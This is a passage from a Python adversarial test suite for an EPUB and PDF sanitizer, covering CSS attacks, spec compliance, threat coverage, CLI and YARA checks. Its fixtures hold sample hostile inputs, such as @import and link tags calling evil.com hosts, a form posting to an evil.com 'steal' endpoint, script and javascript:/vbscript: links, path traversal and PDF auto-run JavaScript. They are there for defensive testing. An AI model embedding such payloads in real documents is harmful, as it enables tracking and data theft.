        ext = os.path.splitext(decoded.lower())[1]
        assert ext in ('.epub', '.pdf')


# ══════════════════════════════════════════════════════════════════════
#  P. CSS / STYLE-BASED ATTACKS
# ══════════════════════════════════════════════════════════════════════

@test("CSS attack: <style> with @import in strict mode")
def test_css_import_strict():
    """@import in <style> blocks should ideally be caught in strict or paranoid."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        xhtml = '''<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Test</title>
<style>@import url("https://evil.com/exfil.css");</style>
</head><body><p>content</p></body></html>'''
        _build_epub_raw_xhtml(p, xhtml)
        EPUBSanitizer(p).sanitize(out, SanitizeMode.PARANOID)
        with zipfile.ZipFile(out) as zf:
            for name in zf.namelist():
                if name.endswith('.xhtml'):
                    content = zf.read(name).decode('utf-8', errors='replace')
                    assert '@import' not in content or 'removed' in content, \
                        "@import survived paranoid"
    finally:
        _cleanup(p, out)


@test("CSS attack: <link> to external stylesheet in head")
def test_css_external_link_head():
    """External CSS <link> in head should be removed in strict mode."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        xhtml = '''<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Test</title>
<link rel="stylesheet" type="text/css" href="https://cdn.evil.com/styles.css"/>
</head><body><p>content</p></body></html>'''
        _build_epub_raw_xhtml(p, xhtml)
        EPUBSanitizer(p).sanitize(out, SanitizeMode.STRICT)
        with zipfile.ZipFile(out) as zf:
            for name in zf.namelist():
                if name.endswith('.xhtml'):
                    content = zf.read(name).decode('utf-8', errors='replace')
                    assert 'cdn.evil.com' not in content, \
                        "External CSS link survived strict mode"
    finally:
        _cleanup(p, out)


@test("CSS attack: background-image url() with external tracking")
def test_css_background_tracking():
    """Inline style with background-image can be used for tracking."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<div style="background-image:url(https://evil.com/track)">x</div>')
        r = EPUBSanitizer(p).scan()
        # Current scanner doesn't parse CSS in style attributes
        # Just verify no crash
        assert len(r.errors) == 0
    finally:
        _cleanup(p)


@test("CSS attack: multiple @import rules in style block")
def test_css_multiple_imports():
    """Multiple @import url() rules should all be stripped in paranoid."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        xhtml = '''<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Test</title>
<style>
@import url("https://evil1.com/a.css");
@import url("https://evil2.com/b.css");
body { color: black; }
@import url("https://evil3.com/c.css");
</style>
</head><body><p>content</p></body></html>'''
        _build_epub_raw_xhtml(p, xhtml)
        EPUBSanitizer(p).sanitize(out, SanitizeMode.PARANOID)
        with zipfile.ZipFile(out) as zf:
            for name in zf.namelist():
                if name.endswith('.xhtml'):
                    content = zf.read(name).decode('utf-8', errors='replace')
                    import_count = content.lower().count('@import url')
                    assert import_count == 0, f"{import_count} @import url() survived paranoid"
    finally:
        _cleanup(p, out)


# ══════════════════════════════════════════════════════════════════════
#  Q. EPUB SPEC COMPLIANCE AFTER SANITIZE
# ══════════════════════════════════════════════════════════════════════

@test("EPUB spec: mimetype is first entry after sanitize")
def test_epub_spec_mimetype_first():
    """EPUB spec requires mimetype as the first ZIP entry."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        _build_epub(p, "<script>x</script><p>content</p>")
        EPUBSanitizer(p).sanitize(out, SanitizeMode.STANDARD)
        with zipfile.ZipFile(out) as zf:
            entries = zf.infolist()
            assert entries[0].filename == "mimetype", \
                f"First entry is {entries[0].filename}, expected 'mimetype'"
    finally:
        _cleanup(p, out)


@test("EPUB spec: mimetype is uncompressed (ZIP_STORED)")
def test_epub_spec_mimetype_stored():
    """EPUB spec requires mimetype to be ZIP_STORED (no compression)."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        _build_epub(p, "<p>content</p>")
        EPUBSanitizer(p).sanitize(out, SanitizeMode.STANDARD)
        with zipfile.ZipFile(out) as zf:
            info = zf.getinfo('mimetype')
            assert info.compress_type == zipfile.ZIP_STORED, \
                f"mimetype compression type is {info.compress_type}, expected STORED"
    finally:
        _cleanup(p, out)


@test("EPUB spec: mimetype content is correct")
def test_epub_spec_mimetype_content():
    """Mimetype content must be exactly 'application/epub+zip'."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        _build_epub(p, "<p>content</p>")
        EPUBSanitizer(p).sanitize(out, SanitizeMode.STANDARD)
        with zipfile.ZipFile(out) as zf:
            content = zf.read('mimetype')
            assert content == b'application/epub+zip', f"Mimetype content: {content}"
    finally:
        _cleanup(p, out)


@test("EPUB spec: other content files use DEFLATE compression")
def test_epub_spec_deflate():
    """Non-mimetype files should use ZIP_DEFLATED."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        _build_epub(p, "<p>content</p>")
        EPUBSanitizer(p).sanitize(out, SanitizeMode.STANDARD)
        with zipfile.ZipFile(out) as zf:
            for info in zf.infolist():
                if info.filename != 'mimetype':
                    assert info.compress_type == zipfile.ZIP_DEFLATED, \
                        f"{info.filename} uses {info.compress_type}, expected DEFLATED"
    finally:
        _cleanup(p, out)


@test("EPUB spec: mimetype is created even if missing from source")
def test_epub_spec_mimetype_created():
    """If source EPUB lacks mimetype, sanitizer should create one."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        # Build EPUB without mimetype
        with zipfile.ZipFile(p, 'w') as zf:
            zf.writestr('OEBPS/ch1.xhtml', '<html><body><p>test</p></body></html>')
        EPUBSanitizer(p).sanitize(out, SanitizeMode.STANDARD)
        if os.path.isfile(out):
            with zipfile.ZipFile(out) as zf:
                assert 'mimetype' in zf.namelist(), "mimetype not created"
                assert zf.read('mimetype') == b'application/epub+zip'
    finally:
        _cleanup(p, out)


@test("EPUB spec: forward slashes used in ZIP paths (not backslashes)")
def test_epub_spec_forward_slashes():
    """ZIP paths should use / not \\ (cross-platform compliance)."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        _build_epub(p, "<p>content</p>", extra_files={
            "OEBPS/styles/main.css": b"body { color: black; }"
        })
        EPUBSanitizer(p).sanitize(out, SanitizeMode.STANDARD)
        with zipfile.ZipFile(out) as zf:
            for name in zf.namelist():
                assert '\\' not in name, f"Backslash found in path: {name}"
    finally:
        _cleanup(p, out)


# ══════════════════════════════════════════════════════════════════════
#  R. THREAT MODEL COVERAGE
# ══════════════════════════════════════════════════════════════════════

@test("Threat model: scan report threat_summary includes all severities")
def test_threat_model_summary():
    """threat_summary() should always return High, Medium, Low keys."""
    r = SanitizeReport("/test.epub")
    s = r.threat_summary()
    assert "High" in s
    assert "Medium" in s
    assert "Low" in s


@test("Threat model: EPUB with all threat types simultaneously")
def test_threat_model_all_types():
    """An EPUB containing every threat type should detect them all."""
    p = _tmp_path('.epub')
    try:
        body = '''
<script>evil()</script>
<iframe src="https://evil.com"></iframe>
<embed src="data:text/html,x"/>
<object data="evil.swf"></object>
<applet code="Evil.class"></applet>
<form action="https://evil.com/steal"><input/></form>
<img onerror="alert(1)" src="x"/>
<p onclick="fn()">text</p>
<a href="javascript:void(0)">js</a>
<a href="vbscript:MsgBox(1)">vbs</a>
<a href="https://tracker.com/track">link</a>
'''
        _build_epub(p, body, extra_files={
            "payload.exe": b"\x00",
            "data.dat": b"x",
            "../traversal": b"x",
        })
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        expected = {"DangerousTag", "EventHandler", "DangerousProtocol",
                    "ExternalLink", "DangerousFile", "SuspiciousFile",
                    "DirectoryTraversal"}
        missing = expected - types
        assert len(missing) == 0, f"Missing threat types: {missing}"
    finally:
        _cleanup(p)


@test("Threat model: PDF with all threat types simultaneously")
def test_threat_model_all_pdf():
    """A PDF with multiple threat vectors should detect them all."""
    from pypdf import PdfWriter
    from pypdf.generic import DictionaryObject, NameObject, TextStringObject, ArrayObject

    p = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        writer.add_blank_page(width=612, height=792)

        # /OpenAction with JS
        oa = DictionaryObject()
        oa[NameObject("/S")] = NameObject("/JavaScript")
        oa[NameObject("/JS")] = TextStringObject("alert(1)")
        writer._root_object[NameObject("/OpenAction")] = oa

        # /Names -> /JavaScript
        js_action = DictionaryObject()
        js_action[NameObject("/S")] = NameObject("/JavaScript")
        js_action[NameObject("/JS")] = TextStringObject("exploit()")
        js_tree = DictionaryObject()
        js_tree[NameObject("/Names")] = ArrayObject([TextStringObject("js"), js_action])
        ef_tree = DictionaryObject()
        ef_tree[NameObject("/Names")] = ArrayObject([TextStringObject("f"), DictionaryObject()])
        names = DictionaryObject()
        names[NameObject("/JavaScript")] = js_tree
        names[NameObject("/EmbeddedFiles")] = ef_tree
        writer._root_object[NameObject("/Names")] = names

        # /AA on page
        page = writer.pages[0]
        aa = DictionaryObject()
        js2 = DictionaryObject()
        js2[NameObject("/S")] = NameObject("/JavaScript")
        js2[NameObject("/JS")] = TextStringObject("aa()")
        aa[NameObject("/O")] = js2
        page[NameObject("/AA")] = aa

        with open(p, "wb") as f:
            writer.write(f)

        r = PDFSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert len(types) >= 3, f"Expected >=3 distinct threat types, got: {types}"
    finally:
        _cleanup(p)


@test("Threat model: sanitize mode escalation (standard < strict < paranoid)")
def test_threat_model_mode_escalation():
    """Paranoid should remove MORE than strict, which removes more than standard."""
    p = _tmp_path('.epub')
    try:
        body = '''<script>evil()</script>
<a href="https://external.com">link</a>
<img src="https://tracker.com/pixel.gif"/>'''
        _build_epub(p, body, extra_files={"data.dat": b"x"})

        results = {}
        for mode in [SanitizeMode.STANDARD, SanitizeMode.STRICT, SanitizeMode.PARANOID]:
            out = _tmp_path('.epub')
            try:
                EPUBSanitizer(p).sanitize(out, mode)
                r2 = EPUBSanitizer(out).scan()
                results[mode] = len(r2.threats)
            finally:
                _cleanup(out)

        # Standard allows external links -> more residual threats
        # Strict strips links -> fewer
        # Paranoid strips everything -> fewest (should be 0)
        assert results[SanitizeMode.STANDARD] >= results[SanitizeMode.STRICT], \
            f"Standard ({results[SanitizeMode.STANDARD]}) should have >= threats than Strict ({results[SanitizeMode.STRICT]})"
        assert results[SanitizeMode.STRICT] >= results[SanitizeMode.PARANOID], \
            f"Strict ({results[SanitizeMode.STRICT]}) should have >= threats than Paranoid ({results[SanitizeMode.PARANOID]})"
    finally:
        _cleanup(p)


@test("Threat model: sanitize report success flag correctness")
def test_threat_model_success_flag():
    """Success flag should be True on success, False on failure."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        _build_epub(p, "<p>content</p>")
        r = EPUBSanitizer(p).sanitize(out, SanitizeMode.STANDARD)
        assert r.success is True
        assert r.sanitized_path == out
    finally:
        _cleanup(p, out)


@test("Threat model: sanitize report failure on invalid input")
def test_threat_model_failure_flag():
    """Invalid input should set success=False."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        with open(p, 'w') as f:
            f.write("not a zip")
        r = EPUBSanitizer(p).sanitize(out, SanitizeMode.STANDARD)
        assert r.success is False
        assert len(r.errors) > 0
    finally:
        _cleanup(p, out)


# ══════════════════════════════════════════════════════════════════════
#  S. CLI EXTENDED TESTS
# ══════════════════════════════════════════════════════════════════════

@test("CLI: scan all 3 modes for PDF")
def test_cli_pdf_all_modes():
    """CLI sanitize should work for all 3 modes on PDF."""
    p = _tmp_path('.pdf')
    try:
        _build_simple_pdf(p, with_js=True)
        for mode in ["standard", "strict", "paranoid"]:
            out = _tmp_path('.pdf')
            try:
                f = io.StringIO()
                with redirect_stdout(f):
                    code = cli_main(["sanitize", p, "-m", mode, "-o", out])
                assert code == 0, f"CLI sanitize PDF mode={mode} failed with code {code}"
                assert os.path.isfile(out), f"Output not created for mode={mode}"
            finally:
                _cleanup(out)
    finally:
        _cleanup(p)


@test("CLI: scan all 3 modes for EPUB")
def test_cli_epub_all_modes():
    """CLI sanitize should work for all 3 modes on EPUB."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, "<script>x</script><a href='https://evil.com'>link</a>")
        for mode in ["standard", "strict", "paranoid"]:
            out = _tmp_path('.epub')
            try:
                f = io.StringIO()
                with redirect_stdout(f):
                    code = cli_main(["sanitize", p, "-m", mode, "-o", out])
                assert code == 0, f"CLI sanitize EPUB mode={mode} failed with code {code}"
            finally:
                _cleanup(out)
    finally:
        _cleanup(p)


@test("CLI: scan --json --verbose output separation")
def test_cli_json_verbose_separation():
    """In JSON mode, verbose logs go to stderr, JSON goes to stdout."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, "<script>x</script>")
        f_out = io.StringIO()
        f_err = io.StringIO()
        with redirect_stdout(f_out), redirect_stderr(f_err):
            cli_main(["scan", p, "--json", "--verbose"])
        stdout = f_out.getvalue()
        # stdout should be valid JSON
        data = json.loads(stdout)
        assert "has_threats" in data
    finally:
        _cleanup(p)


@test("CLI: gui sub-command exists in parser")
def test_cli_gui_subcommand():
    """The 'gui' sub-command should be recognized."""
    parser = build_parser()
    args = parser.parse_args(["gui"])
    assert args.command == "gui"


@test("CLI: scan returns 0 for clean PDF")
def test_cli_scan_clean_pdf():
    """Clean PDF scan should return exit code 0."""
    p = _tmp_path('.pdf')
    try:
        _build_simple_pdf(p)
        f = io.StringIO()
        with redirect_stdout(f):
            code = cli_main(["scan", p])
        assert code == 0
    finally:
        _cleanup(p)


@test("CLI: scan returns 1 for malicious PDF")
def test_cli_scan_malicious_pdf():
    """Malicious PDF scan should return exit code 1."""
    p = _tmp_path('.pdf')
    try:
        _build_simple_pdf(p, with_js=True)
        f = io.StringIO()
        with redirect_stdout(f):
            code = cli_main(["scan", p])
        assert code == 1
    finally:
        _cleanup(p)


# ══════════════════════════════════════════════════════════════════════
#  T. YARA INTEGRATION EDGE CASES
# ══════════════════════════════════════════════════════════════════════

@test("YARA: scan_data with large binary data")
def test_yara_large_data():
    """YARA scan with 1MB of random-ish data should not crash."""
    ys = YaraScanner()
    data = bytes(range(256)) * 4096  # 1MB
    result = ys.scan_data(data)
    assert isinstance(result, list)


@test("YARA: scan_file returns list for valid file")
def test_yara_scan_valid_file():
    """YARA scan on an existing file should return a list."""
    ys = YaraScanner()
    p = _tmp_path('.bin')
    try:
        with open(p, 'wb') as f:
            f.write(b"\x00" * 1000)
        result = ys.scan_file(p)
        assert isinstance(result, list)
    finally:
        _cleanup(p)


@test("YARA: scanner is importable and instantiable")
def test_yara_importable():
    """YaraScanner should always be importable regardless of yara-python."""
    ys = YaraScanner()
    assert hasattr(ys, 'available')
    assert hasattr(ys, 'scan_file')
    assert hasattr(ys, 'scan_data')
    assert hasattr(ys, '_rules')


# ══════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════

ALL_TESTS = [
    # K. Advanced PDF Evasion
    test_pdf_xfa_root,
    test_pdf_importdata,
    test_pdf_uri_action,
    test_pdf_multi_page_threats,
    test_pdf_deep_nested_js,
    test_pdf_sanitize_strict_submitform,
    test_pdf_paranoid_root_whitelist,
    test_pdf_hex_submitform,
    test_pdf_hex_embedded,
    test_pdf_hex_xfa,

    # L. Protocol / URI Evasion
    test_epub_url_encoded_js,
    test_epub_js_allcaps,
    test_epub_js_newline,
    test_epub_data_app_js,
    test_epub_data_b64_html,
    test_epub_data_svg,
    test_epub_multiple_href,
    test_epub_css_expression,
    test_epub_css_moz_binding,
    test_epub_external_font,
    test_epub_external_css_link,

    # M. Content Integrity
    test_epub_text_preserved,
    test_epub_css_preserved,
    test_epub_images_preserved,
    test_epub_internal_links_preserved,
    test_epub_table_preserved,
    test_pdf_page_count_preserved,
    test_pdf_mediabox_preserved,

    # N. Performance / DoS / ReDoS
    test_redos_dangerous_protocols,
    test_redos_on_event,
    test_perf_many_tags,
    test_perf_many_event_handlers,
    test_perf_pdf_10_pages,
    test_perf_epub_50_files_sanitize,

    # O. GUI Logic
    test_gui_create_epub,
    test_gui_create_pdf,
    test_gui_create_unsupported,
    test_gui_create_verbose,
    test_gui_create_case_insensitive,
    test_gui_i18n_format,
    test_gui_i18n_multiple_listeners,
    test_gui_theme_attrs,
    test_gui_dragdrop_bytes,

    # P. CSS / Style Attacks
    test_css_import_strict,
    test_css_external_link_head,
    test_css_background_tracking,
    test_css_multiple_imports,

    # Q. EPUB Spec Compliance
    test_epub_spec_mimetype_first,
    test_epub_spec_mimetype_stored,
    test_epub_spec_mimetype_content,
    test_epub_spec_deflate,
    test_epub_spec_mimetype_created,
    test_epub_spec_forward_slashes,

    # R. Threat Model Coverage
    test_threat_model_summary,
    test_threat_model_all_types,
    test_threat_model_all_pdf,
    test_threat_model_mode_escalation,
    test_threat_model_success_flag,
    test_threat_model_failure_flag,

    # S. CLI Extended
    test_cli_pdf_all_modes,
    test_cli_epub_all_modes,
    test_cli_json_verbose_separation,
    test_cli_gui_subcommand,
    test_cli_scan_clean_pdf,
    test_cli_scan_malicious_pdf,

    # T. YARA Extended
    test_yara_large_data,
    test_yara_scan_valid_file,
    test_yara_importable,
]


def main():
    print("=" * 70)
    print("  eBookSanitizer - Supplemental Adversarial Tests (Round 2)")
    print(f"  {len(ALL_TESTS)} test cases")
    print("=" * 70)

    sections_map = {
        "K. Advanced PDF Evasion": ALL_TESTS[:10],
        "L. Protocol / URI Evasion": ALL_TESTS[10:21],
        "M. Content Integrity After Sanitization": ALL_TESTS[21:28],
        "N. Performance / DoS / ReDoS Resistance": ALL_TESTS[28:34],
        "O. GUI Logic Unit Tests": ALL_TESTS[34:43],
        "P. CSS / Style-Based Attacks": ALL_TESTS[43:47],
        "Q. EPUB Spec Compliance After Sanitize": ALL_TESTS[47:53],
        "R. Threat Model Coverage": ALL_TESTS[53:59],
        "S. CLI Extended Tests": ALL_TESTS[59:65],
        "T. YARA Extended Edge Cases": ALL_TESTS[65:],
    }

    for title, tests in sections_map.items():
        section(title)
        for t in tests:
            run_test(t)

    section("SUMMARY")
    for name, passed, err in _results:
        status = "[PASS]" if passed else "[FAIL]"
        line = f"  {status} {name}"
        if err and not passed:
            line += f"  ({err[:80]})"
        print(line)

    print(f"\n  {_passed}/{_total} tests passed")
    if _passed == _total:
        print("  [OK] All tests passed!")
    else:
        print(f"  [XX] {_total - _passed} test(s) FAILED")

    return 0 if _passed == _total else 1


if __name__ == "__main__":
    sys.exit(main())
